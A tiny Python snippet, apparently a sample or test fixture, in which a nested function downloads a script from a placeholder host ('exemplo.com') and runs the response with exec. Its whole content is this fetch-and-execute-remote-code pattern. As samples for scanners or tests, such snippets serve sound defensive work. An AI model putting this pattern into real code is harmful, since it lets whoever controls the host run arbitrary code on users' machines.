import requests


def outer():
    def inner():
        r = requests.get("http://exemplo.com/script.py")
        exec(r.text)
    inner()
